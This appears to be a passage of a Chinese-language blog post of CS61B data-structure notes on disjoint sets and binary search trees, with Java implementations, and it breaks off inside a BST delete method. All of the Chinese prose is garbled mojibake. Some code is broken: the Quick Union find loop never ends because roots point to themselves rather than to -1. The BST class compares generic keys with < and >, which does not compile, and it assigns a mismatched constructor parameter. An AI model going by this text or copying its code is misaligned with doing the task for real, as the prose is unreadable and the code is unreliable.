ä¸»è¦ä»‹ç»äº†æ—¶é—´å¤æ‚åº¦å’Œç©ºé—´å¤æ‚åº¦çš„è®¡ç®—ï¼Œä»¥åŠä¸€äº›ç»å…¸ç®—æ³•çš„æ—¶é—´å¤æ‚åº¦åˆ†ææ–¹æ³•ï¼Œå¦‚å°oã€å¤§Oæ³•ç­‰ï¼Œæ­¤å¤„ä¸å†ä¸¾ä¾‹è¯´æ˜ã€‚</p><h1 id="Disjoint-Sets"><a href="#Disjoint-Sets" class="headerlink" title="Disjoint Sets"></a>Disjoint Sets</h1><p>ä¸ç›¸äº¤é›†çš„å®šä¹‰ï¼šå¦‚æœä¸¤ä¸ªé›†åˆæ²¡æœ‰å…±åŒå…ƒç´ ï¼Œåˆ™å®ƒä»¬è¢«ç§°ä¸ºä¸ç›¸äº¤é›†åˆã€‚è¯¥æ•°æ®ç»“æ„æœ‰ä¸¤ä¸ªæ“ä½œï¼š</p><ol><li>connect(x, y):è¿æ¥xå’Œyï¼Œä¹Ÿè¢«ç§°ä¸ºunion</li><li>isConnected(x, y):è¿”å›xå’Œyæ˜¯å¦è¿æ¥</li></ol><p>ä¸ç›¸äº¤é›†æ•°æ®ç»“æ„å…·æœ‰å›ºå®šæ•°é‡çš„å…ƒç´ ï¼Œæ¯ä¸ªå…ƒç´ éƒ½ä»è‡ªå·±çš„å­é›†ä¸­å¼€å§‹ã€‚é€šè¿‡å¯¹æŸäº›å…ƒç´  x å’Œ y è°ƒç”¨ connect(x, y) ï¼Œæˆ‘ä»¬å°†å­é›†åˆå¹¶åœ¨ä¸€èµ·ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">DisjointSets</span> &#123;<br>    <span class="hljs-comment">/** connects two items P and Q */</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">connect</span><span class="hljs-params">(<span class="hljs-type">int</span> p, <span class="hljs-type">int</span> q)</span>;<br><br>    <span class="hljs-comment">/** checks to see if two items are connected */</span><br>    <span class="hljs-type">boolean</span> <span class="hljs-title function_">isConnected</span><span class="hljs-params">(<span class="hljs-type">int</span> p, <span class="hljs-type">int</span> q)</span>; <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Quick-Find"><a href="#Quick-Find" class="headerlink" title="Quick Find"></a>Quick Find</h2><p>ç›´è§‚ä¸Šï¼Œæˆ‘ä»¬å¯èƒ½é¦–å…ˆè€ƒè™‘å°†ä¸ç›¸äº¤é›†è¡¨ç¤ºä¸ºé›†åˆåˆ—è¡¨:<br>[{0}, {1}, {2}, {3}, {4}, {5}, {6}]<br>ä½†è¿™æ ·å¦‚æœæˆ‘ä»¬è¿›è¡Œconnectæ“ä½œï¼Œéœ€è¦éå†Listï¼Œæ—¶é—´å¤æ‚åº¦ä¸º $O(n)$ ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬è€ƒè™‘ä½¿ç”¨æ•°ç»„è¡¨ç¤ºï¼š</p><ul><li>æ•°ç»„çš„ç´¢å¼•ä»£è¡¨æˆ‘ä»¬é›†åˆçš„å…ƒç´ ã€‚</li><li>ç´¢å¼•å¤„çš„å€¼æ˜¯å®ƒæ‰€å±çš„é›†åˆç¼–å·ã€‚</li></ul><p>ä¾‹å¦‚ï¼Œæˆ‘ä»¬å°† {0, 1, 2, 4}, {3, 5}, {6} è¡¨ç¤ºä¸ºï¼š</p><p><img src="/Pictures/CS61b/02/arrayset.png" alt="img"></p><p>æ‰§è¡Œconnectæ“ä½œå°±æ˜¯æŠŠå¯¹åº”åºå·çš„å€¼æ”¹ä¸ºé›†åˆçš„ç¼–å·</p><p>æ‰§è¡ŒisConnectedæ“ä½œå³æ£€æŸ¥åºå·çš„å€¼æ˜¯å¦ç›¸ç­‰ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">QuickFindDS</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">DisjointSets</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span>[] id;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">QuickFindDS</span><span class="hljs-params">(<span class="hljs-type">int</span> N)</span>&#123;<br>        id = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[N];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; N; i++)&#123;<br>            id[i] = i;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">connect</span><span class="hljs-params">(<span class="hljs-type">int</span> p, <span class="hljs-type">int</span> q)</span>&#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">pid</span> <span class="hljs-operator">=</span> id[p];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">qid</span> <span class="hljs-operator">=</span> id[q];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; id.length; i++)&#123;<br>            <span class="hljs-keyword">if</span> (id[i] == pid)&#123;<br>                id[i] = qid;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isConnected</span><span class="hljs-params">(<span class="hljs-type">int</span> p, <span class="hljs-type">int</span> q)</span>&#123;<br>        <span class="hljs-keyword">return</span> (id[p] == id[q]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Quick-Union"><a href="#Quick-Union" class="headerlink" title="Quick Union"></a>Quick Union</h2><p>åœ¨Quick Findä¸­ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦å¿«é€Ÿçš„å°†å¤šä¸ªé›†åˆconnectæ˜¯éå¸¸å›°éš¾çš„ã€‚</p><p>è¿™æ—¶ï¼Œæˆ‘ä»¬è€ƒè™‘ä¸ºæ¯ä¸ªé¡¹ç›®åˆ†é…å…¶çˆ¶é›†çš„ç´¢å¼•ç¼–å·è€Œä¸æ˜¯idï¼Œå¦‚æœä¸€ä¸ªé›†åˆæ²¡æœ‰çˆ¶é¡¹ï¼Œæˆ‘ä»¬ä¸ºå…¶èµ‹å€¼ä¸º-1.</p><p>è¿™ç§æ–¹æ³•æ”¯æŒæˆ‘ä»¬å°†æ¯ä¸ªé›†åˆæƒ³è±¡æˆä¸€æ£µæ ‘ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬å°† {0, 1, 2, 4}, {3, 5}, {6} è¡¨ç¤ºä¸ºï¼š</p><p><img src="/Pictures/CS61b/02/QuickUnion.png" alt="img"></p><p>å¯¹äº QuickUnionï¼Œæˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªè¾…åŠ©å‡½æ•° find(int item) ï¼Œå®ƒè¿”å› item æ‰€åœ¨æ ‘çš„æ ¹ã€‚ä¾‹å¦‚ï¼Œå¯¹äºä¸Šé¢çš„é›†åˆï¼Œ find(4) &#x3D;&#x3D; 0 ã€ find(1) &#x3D;&#x3D; 0 ã€ find(5) &#x3D;&#x3D; 3 ç­‰ã€‚æ¯ä¸ªå…ƒç´ éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„root.</p><p>å½“æˆ‘ä»¬æƒ³è¦è¿æ¥ä¸¤ä¸ªé›†åˆæ—¶ï¼Œæˆ‘ä»¬åªéœ€è¦å°†Aé›†çš„rootè¿æ¥åˆ°Bé›†çš„rootä¸Šï¼Œå³æŠŠAé›†ä½œä¸ºBé›†çš„ä¸€ä¸ªbranchã€‚</p><p>æ£€æŸ¥ä¸¤ä¸ªé›†åˆæ˜¯å¦ä¸ºç›¸è¿çš„ï¼Œæˆ‘ä»¬åªéœ€è¦æ£€æŸ¥ä¸¤ä¸ªé›†åˆæ˜¯å¦å…·æœ‰ç›¸åŒçš„rootã€‚</p><p>åœ¨æ€§èƒ½æ–¹é¢ï¼Œåˆ©ç”¨æ ‘å¯ä»¥ä½¿è¿æ¥å˜å¾—ååˆ†ç®€å•ï¼Œä½†ç›¸åº”çš„ï¼Œå½“æˆ‘ä»¬æƒ³è¦æŸ¥æ‰¾æŸä¸€ä¸ªå…ƒç´ æ—¶ï¼Œæˆ‘ä»¬éœ€è¦éå†æ ‘çš„å„ä¸ªbranchï¼Œæ—¶é—´å¤æ‚åº¦ä¸º $O(n)$</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">QuickUnionDS</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">DisjointSets</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span>[] parent;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">QuickUnionDS</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span> &#123;<br>        parent = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[num];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; num; i++) &#123;<br>            parent[i] = i;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-title function_">find</span><span class="hljs-params">(<span class="hljs-type">int</span> p)</span> &#123;<br>        <span class="hljs-keyword">while</span> (parent[p] &gt;= <span class="hljs-number">0</span>) &#123;<br>            p = parent[p];<br>        &#125;<br>        <span class="hljs-keyword">return</span> p;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">connect</span><span class="hljs-params">(<span class="hljs-type">int</span> p, <span class="hljs-type">int</span> q)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> find(p);<br>        <span class="hljs-type">int</span> j= find(q);<br>        parent[i] = j;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isConnected</span><span class="hljs-params">(<span class="hljs-type">int</span> p, <span class="hljs-type">int</span> q)</span> &#123;<br>        <span class="hljs-keyword">return</span> find(p) == find(q);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Weighted-Quick-Union-WQU"><a href="#Weighted-Quick-Union-WQU" class="headerlink" title="Weighted Quick Union (WQU)"></a>Weighted Quick Union (WQU)</h2><p>Quick Union çš„æ”¹è¿›ä¾èµ–äºä¸€ä¸ªå…³é”®çš„æ€è·¯ï¼šæ¯å½“æˆ‘ä»¬è°ƒç”¨ find æ—¶ï¼Œæˆ‘ä»¬éƒ½å¿…é¡»æ‰¾åˆ°æ ‘çš„æ ¹éƒ¨ã€‚å› æ­¤ï¼Œæ ‘è¶ŠçŸ­ï¼Œé€Ÿåº¦å°±è¶Šå¿«ã€‚</p><p>æ‰€ä»¥åœ¨æˆ‘ä»¬å°†ä¸¤ä¸ªæ ‘ç›¸è¿æ—¶ï¼Œæˆ‘ä»¬é€‰æ‹©å°†è¾ƒå°çš„æ ‘ä½œä¸ºå­æ ‘è¿æ¥åˆ°è¾ƒå¤§çš„æ ‘ä¸Šã€‚</p><p>å¦‚ä½•è¡¡é‡æ ‘çš„å¤§å°ï¼Ÿåœ¨è¿™é‡Œï¼Œæˆ‘ä»¬ç”¨æ ‘åŒ…å«çš„å…ƒç´ çš„æ•°é‡ä½œä¸ºæ ‘çš„Weightã€‚</p><p>åŸºäºè¿™ç§æ–¹æ³•ï¼Œæˆ‘ä»¬æ‰€è·å¾—çš„æ ‘çš„æœ€å¤§é«˜åº¦å°†ä¼šä¸º $logN$ ï¼Œå…¶ä¸­ $N$ ä¸ºæ ‘æ‰€åŒ…å«å…ƒç´ çš„æ•°é‡ã€‚</p><p>æˆ‘ä»¬å‡è®¾æœ‰æ ‘ $T_{1},T_{2}$ ï¼Œå…¶ä¸­ $T_{1}$ åŒ…å«äº†å…ƒç´  $x$ ï¼Œ $size(T_{2}) \ge size(T_{1})$ ã€‚å½“æˆ‘ä»¬åˆå¹¶ä¸¤ä¸ªtreeæ—¶ï¼Œæˆ‘ä»¬å°† $T_{1}$ è¿æ¥åˆ° $T_{2}$ ä¸‹ï¼Œè¿™ä¸ªæ“ä½œä½¿ $x$ çš„æ·±åº¦å¢åŠ 1ï¼Œè€Œæ•´ä¸ªåˆå¹¶çš„æ ‘å¤§å°è‡³å°‘ä¸º $T_{1}$ çš„ä¸¤å€ï¼Œä¹Ÿå°±æ˜¯è¯´ $2^{h} &#x3D; N$ ï¼Œæœ€å¤§é«˜åº¦ $h &#x3D; \log_{2}{N}$</p><h2 id="Weighted-Quick-Union-with-Path-Compression"><a href="#Weighted-Quick-Union-with-Path-Compression" class="headerlink" title="Weighted Quick Union with Path Compression"></a>Weighted Quick Union with Path Compression</h2><p>åœ¨ä¸Šé¢çš„æ–¹æ³•ä¸­ï¼Œæ¯æ¬¡æˆ‘ä»¬è°ƒç”¨ find(x) æ—¶ï¼Œæˆ‘ä»¬å¿…é¡»éå†ä»xåˆ°root çš„è·¯å¾„ï¼Œå› æ­¤åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å°†è®¿é—®çš„æ‰€æœ‰é¡¹ç›®è¿æ¥åˆ°å®ƒä»¬çš„rootï¼Œæ— éœ€é¢å¤–çš„æ¸è¿›æˆæœ¬ã€‚</p><p>è¿™ç§°ä¸ºæ‘Šé”€è¿è¡Œæ—¶é—´ï¼Œæˆ‘ä»¬é€šè¿‡è¿™ç§æ–¹å¼ä½¿æ ‘å˜å¾—æ›´çŸ­ã€‚</p><h1 id="Binary-Search-Trees"><a href="#Binary-Search-Trees" class="headerlink" title="Binary Search Trees"></a>Binary Search Trees</h1><blockquote><p>Now we are going to learn about perhaps the most important data structure ever. â€“Josh Hug, CS61b</p></blockquote><p>å¯¹äºæœç´¢é¡¹ç›®è€Œè¨€ï¼Œæœ‰åºæ•°æ®ç»“æ„å¦‚é“¾è¡¨ä¸€èˆ¬æ•ˆç‡è¾ƒé«˜ã€‚ä½†å³ä½¿æ˜¯å·²æ’åºçš„åˆ—è¡¨ï¼Œå¯¹äºæœç´¢é¡¹ç›®çš„æ—¶é—´å¤æ‚åº¦ä¾æ—§ä¸º $O(n)$ ã€‚</p><p>å¯¹äºæ•°ç»„ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨äºŒåˆ†æŸ¥æ‰¾æ¥æ›´å¿«çš„æ‰¾åˆ°å…ƒç´ ã€‚</p><h2 id="Binary-Search"><a href="#Binary-Search" class="headerlink" title="Binary Search"></a>Binary Search</h2><p>ä½¿ç”¨äºŒåˆ†æŸ¥æ‰¾çš„æ¡ä»¶ï¼š</p><ol><li>æ•°æ®ç»“æ„å¿…é¡»æ˜¯æœ‰åºçš„</li><li>è®¿é—®æ•°æ®ç»“æ„çš„ä»»ä½•å…ƒç´ éƒ½éœ€è¦æ’å®šæ—¶é—´</li></ol><p>äºŒåˆ†æŸ¥æ‰¾çš„ä¸€èˆ¬æ­¥éª¤ï¼š</p><p>åœ¨äºŒåˆ†æŸ¥æ‰¾ç®—æ³•ä¸­ï¼Œé€šè¿‡æŸ¥æ‰¾ä¸­é—´ç´¢å¼• â€œmidâ€ å°†æœç´¢ç©ºé—´åˆ†ä¸ºä¸¤åŠ</p><p>å¦‚æœmidä¸æ˜¯æˆ‘ä»¬éœ€è¦çš„ï¼Œé€‰æ‹©å…ƒç´ å­˜åœ¨çš„ä¸€ä¾§ç»§ç»­è¿›è¡ŒäºŒåˆ†æŸ¥æ‰¾ï¼ŒçŸ¥é“æ‰¾åˆ°æˆ–è€…ç©ºé—´è€—å°½ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br> <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">BinarySearch</span> &#123;<br>    <span class="hljs-comment">// Returns index of x if it is present in arr[].</span><br>    <span class="hljs-type">int</span> <span class="hljs-title function_">binarySearch</span><span class="hljs-params">(<span class="hljs-type">int</span> arr[], <span class="hljs-type">int</span> x)</span><br>    &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">l</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>, r = arr.length - <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span> (l &lt;= r) &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> l + (r - l) / <span class="hljs-number">2</span>;<br> <br>            <span class="hljs-comment">// Check if x is present at mid</span><br>            <span class="hljs-keyword">if</span> (arr[m] == x)<br>                <span class="hljs-keyword">return</span> m;<br> <br>            <span class="hljs-comment">// If x greater, ignore left half</span><br>            <span class="hljs-keyword">if</span> (arr[m] &lt; x)<br>                l = m + <span class="hljs-number">1</span>;<br> <br>            <span class="hljs-comment">// If x is smaller, ignore right half</span><br>            <span class="hljs-keyword">else</span><br>                r = m - <span class="hljs-number">1</span>;<br>        &#125;<br> <br>        <span class="hljs-comment">// If we reach here, then element was</span><br>        <span class="hljs-comment">// not present</span><br>        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åŸºäºæœ‰åºé“¾è¡¨ï¼Œæˆ‘ä»¬å®ç°BSTçš„æ­¥éª¤ä¸€èˆ¬å¦‚ä¸‹ï¼š</p><ol><li>å°†å“¨å…µèŠ‚ç‚¹æŒ‡å‘é“¾è¡¨çš„ä¸­é—´ï¼Œå¹¶æ›´æ”¹é“¾è¡¨ä¹‹é—´çš„æŒ‡å‘</li><li>åˆ¤æ–­è¦æœç´¢çš„å…ƒç´ ä½äºå“ªä¸€ä¾§</li><li>åœ¨ä¸€ä¾§é€’å½’ä¸Šè¿°è¿‡ç¨‹</li></ol><h2 id="Tree"><a href="#Tree" class="headerlink" title="Tree"></a>Tree</h2><p>ä¸‹é¢æˆ‘ä»¬ç»™å‡ºä¸¥æ ¼çš„æ ‘å®šä¹‰ã€‚<br>æ ‘ç”±èŠ‚ç‚¹ä»¥åŠè¿æ¥èŠ‚ç‚¹çš„è¿™äº›è¾¹ç»„æˆã€‚</p><blockquote><p>æ³¨æ„ï¼šä»»æ„ä¸¤ä¸ªèŠ‚ç‚¹ä¹‹é—´æœ‰ä¸”ä»…æœ‰ä¸€æ¡è·¯å¾„ï¼Œå³ä¸å½¢æˆå›è·¯ï¼Œæ²¡æœ‰è¿æ”¯ã€‚</p></blockquote><p>æ²¡æœ‰çˆ¶èŠ‚ç‚¹çš„èŠ‚ç‚¹ç§°ä¸ºrootï¼Œæ ¹èŠ‚ç‚¹ã€‚åœ¨æ‹“æ‰‘å­¦ä¸­ï¼Œæ ¹èŠ‚ç‚¹å®é™…ä¸Šå­˜åœ¨å¤šç§å¯èƒ½æ€§ï¼Œè¿™é‡Œæˆ‘ä»¬åªä»»æ„é€‰å–ä¸€ç§ã€‚</p><p>æ²¡æœ‰å­èŠ‚ç‚¹çš„èŠ‚ç‚¹ç§°ä¸ºå¶å­ï¼ˆleafï¼‰</p><p>å°†å…¶ä¸æˆ‘ä»¬ä¹‹å‰æå‡ºçš„åŸå§‹æ ‘ç»“æ„è”ç³»èµ·æ¥ï¼Œæˆ‘ä»¬ç°åœ¨å¯ä»¥å‘å·²ç»å­˜åœ¨çš„çº¦æŸå¼•å…¥æ–°çš„çº¦æŸã€‚è¿™ä¼šåˆ›å»ºæ›´å…·ä½“ç±»å‹çš„æ ‘ã€‚</p><ul><li>Binary Treesï¼šäºŒå‰æ ‘ï¼Œè§„å®šæ¯ä¸ªèŠ‚ç‚¹æœ€å¤šåªæœ‰2ä¸ªå­èŠ‚ç‚¹</li><li>Binary Search Trees<br>äºŒå‰æœç´¢æ ‘ï¼Œæ˜¯ä¸€ç§äºŒå‰æ ‘ï¼Œå¯¹äºæ ‘ä¸­çš„æ¯ä¸ªèŠ‚ç‚¹Xï¼š</li></ul><ol><li>å·¦å­æ ‘ä¸­çš„æ¯ä¸ªé”®éƒ½å°äºXçš„é”®</li><li>å³å­æ ‘ä¸­çš„æ¯ä¸ªé”®éƒ½å¤§äºXçš„é”®</li></ol><p>åŸºäºè¿™ç§ç‰¹æ®Šçš„æ€§è´¨ï¼Œæˆ‘ä»¬å¾—ä»¥å°†äºŒåˆ†æœç´¢åº”ç”¨äºè¿™ç§æ•°æ®ç»“æ„ä¸Šã€‚</p><p>å¯¹äºäºŒå‰æœç´¢æ ‘çš„æ’å…¥æ“ä½œï¼Œæˆ‘ä»¬åŸºäºä»¥ä¸‹çš„æ€è·¯ï¼š</p><ul><li>é¦–å…ˆæˆ‘ä»¬æœç´¢è¯¥èŠ‚ç‚¹ï¼Œå¦‚æœè¯¥èŠ‚ç‚¹å·²ç»å­˜åœ¨ï¼Œåˆ™ä¸éœ€è¦æ’å…¥</li><li>å¦‚æœæˆ‘ä»¬æ²¡æœ‰æ‰¾åˆ°è¯¥èŠ‚ç‚¹ï¼Œå®é™…ä¸Šæˆ‘ä»¬åœæ­¢æœç´¢çš„ä½ç½®æ­£å¥½å°±æ˜¯åº”è¯¥æ’å…¥çš„ä½ç½®çš„çˆ¶èŠ‚ç‚¹ï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥å°†æ–°çš„leafæ·»åŠ åˆ°èŠ‚ç‚¹çš„å·¦ä¾§æˆ–å³ä¾§ã€‚</li></ul><p>å¯¹äºäºŒå‰æ ‘çš„åˆ é™¤æ–¹æ³•ï¼Œæˆ‘ä»¬éœ€è¦è€ƒè™‘ä¸‰ç§æƒ…å†µï¼š</p><ol><li>åˆ é™¤ä¸€ç‰‡å¶å­</li><li>åˆ é™¤ä¸€ä¸ªæœ‰ä¸€ä¸ªå­èŠ‚ç‚¹çš„èŠ‚ç‚¹d</li><li>åˆ é™¤ä¸€ä¸ªæœ‰ä¸¤ä¸ªå­èŠ‚ç‚¹çš„èŠ‚ç‚¹</li></ol><p>å¯¹äºå¶å­ï¼Œæˆ‘ä»¬ç›´æ¥åˆ é™¤çˆ¶èŠ‚ç‚¹å’Œå¶å­ä¹‹é—´çš„è¾¹å³å¯<br>å¯¹äºä¸€ä¸ªå­èŠ‚ç‚¹ï¼Œæˆ‘ä»¬åªéœ€è¦å°†è¯¥èŠ‚ç‚¹çš„çˆ¶èŠ‚ç‚¹çš„æŒ‡é’ˆæŒ‡å‘è¯¥èŠ‚ç‚¹çš„å­èŠ‚ç‚¹å³å¯<br>å¯¹äºä¸¤ä¸ªå­èŠ‚ç‚¹ï¼Œæˆ‘ä»¬ç”¨å³å­æ ‘æœ€å·¦ä¾§çš„èŠ‚ç‚¹ï¼ˆæœ€å°å€¼ï¼‰ä»£æ›¿åˆ é™¤çš„èŠ‚ç‚¹æˆ–ç”¨å·¦å­æ ‘æœ€å³ä¾§çš„èŠ‚ç‚¹ï¼ˆæœ€å¤§å€¼ï¼‰ä»£æ›¿è¯¥èŠ‚ç‚¹ã€‚</p><p>ä¸€ä¸ªç®€å•çš„å®ç°ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BST</span>&lt;Key&gt; &#123;<br>    <span class="hljs-keyword">private</span> Key key;<br>    <span class="hljs-keyword">private</span> BST left;<br>    <span class="hljs-keyword">private</span> BST right;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">BST</span><span class="hljs-params">(Key key, BST left, BST Right)</span> &#123;<br>        <span class="hljs-built_in">this</span>.key = key;<br>        <span class="hljs-built_in">this</span>.left = left;<br>        <span class="hljs-built_in">this</span>.right = right;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">BST</span><span class="hljs-params">(Key key)</span> &#123;<br>        <span class="hljs-built_in">this</span>.key = key;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> BST <span class="hljs-title function_">find</span><span class="hljs-params">(BST T, Key key)</span> &#123;<br>        <span class="hljs-keyword">if</span>(T == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(T.key == key) &#123;<br>            <span class="hljs-keyword">return</span> T;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(T.key &lt; key) &#123;<br>            <span class="hljs-keyword">return</span> find(T.right, key);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> find(T.left, key);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> BST <span class="hljs-title function_">insert</span><span class="hljs-params">(BST T, Key ik)</span> &#123;<br>        <span class="hljs-keyword">if</span> (T == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BST</span>(ik);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (ik &lt; T.key) &#123;<br>            T.left = insert(T.left, ik);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ik &gt; T.key) &#123;<br>            T.right = insert(T.right, ik);<br>        &#125;<br>        <span class="hljs-keyword">return</span> T;<br>    &#125;<br>    <span class="hljs-comment">// A possible version, has not been tested yet.</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> BST <span class="hljs-title function_">delete</span><span class="hljs-params">(BST T, Key dk)</span> &#123;<br>        <span class="hljs-keyword">if</span> (T == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>       